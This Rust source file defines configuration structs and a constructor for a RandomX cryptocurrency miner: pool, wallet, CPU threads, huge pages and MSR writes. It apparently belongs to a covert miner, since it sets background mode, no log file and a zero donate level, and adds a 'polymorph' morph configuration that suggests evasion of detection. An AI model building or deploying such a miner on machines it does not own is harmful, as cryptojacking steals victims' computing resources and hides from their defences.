use serde::{Deserialize, Serialize};
use crate::common::polymorph::MorphConfig;

#[derive(Serialize, Deserialize)]
pub struct Pool {
    pub url: String,
    pub user: String,
    pub pass: String,
    pub keepalive: bool,
    pub nicehash: bool,
}

#[derive(Serialize, Deserialize)]
pub struct CpuConfig {
    pub enabled: bool,
    #[serde(rename = "huge-pages")]
    pub huge_pages: bool,
    pub priority: i32,
    pub asm: String,
    #[serde(rename = "max-threads-hint")]
    pub max_threads_hint: i32,
    #[serde(rename = "yield")]
    pub yield_flag: bool,
    pub rx: Vec<i32>,
}

#[derive(Serialize, Deserialize)]
pub struct RandomXConfig {
    pub init: i32,
    pub mode: String,
    #[serde(rename = "1gb-pages")]
    pub one_gb_pages: bool,
    pub rdmsr: bool,
    pub wrmsr: bool,
}

#[derive(Serialize, Deserialize)]
pub struct MinerConfig {
    pub autosave: bool,
    pub background: bool,
    pub colors: bool,
    #[serde(rename = "donate-level")]
    pub donate_level: i32,
    #[serde(rename = "log-file")]
    pub log_file: Option<String>,
    #[serde(rename = "print-time")]
    pub print_time: i32,
    pub retries: i32,
    #[serde(rename = "retry-pause")]
    pub retry_pause: i32,
    pub pools: Vec<Pool>,
    pub cpu: CpuConfig,
    pub randomx: RandomXConfig,
    pub morph: MorphConfig,
}

impl MinerConfig {
    pub fn new(pool_url: &str, wallet: &str, mining_threads: i32) -> Self {
        Self {
            autosave: true,
            background: true,
            colors: false,
            donate_level: 0,
            log_file: None,
            print_time: 60,
            retries: 5,
            retry_pause: 5,
            pools: vec![Pool {
                url: pool_url.to_string(),
                user: wallet.to_string(),
                pass: "x".to_string(),
                keepalive: true,
                nicehash: false,
            }],
            cpu: CpuConfig {
                enabled: true,
                huge_pages: true,
                priority: 5,
                asm: "intel".to_string(),
                max_threads_hint: mining_threads,
                yield_flag: false,
                rx: vec![0, 15],
            },
            randomx: RandomXConfig {
                init: -1,
                mode: "fast".to_string(),
                one_gb_pages: true,
                rdmsr: true,
                wrmsr: true,
            },
            morph: MorphConfig::generate(),
        }
    }
}
